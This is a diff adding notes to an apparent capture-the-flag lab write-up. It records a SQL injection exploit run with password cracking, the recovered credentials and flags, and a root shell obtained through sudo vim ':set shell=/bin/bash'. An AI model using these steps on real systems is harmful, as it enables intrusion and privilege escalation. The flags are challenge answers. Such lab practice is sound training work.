@@ -25,3 +25,25 @@ found directory /simple
 # webserver doesn't responding....
 # I will use: python3 46635 -u http://ip_address/simple --crack -w rockyoutxt
 # to exploit sqli on this later.
+
+found username and password from database.
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@Admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+
+found userflag user.txt
+flag: G00d j0b, keep up!
+
+#sudo -l 
+(root) nopasswd vim
+
+Run vim with sudo and then spawn the root shell with it.
+:set shell=/bin/bash
+:shell
+
+found root flag in root directory
+rootFlag: W3ll d0n3. You made it!
+
+
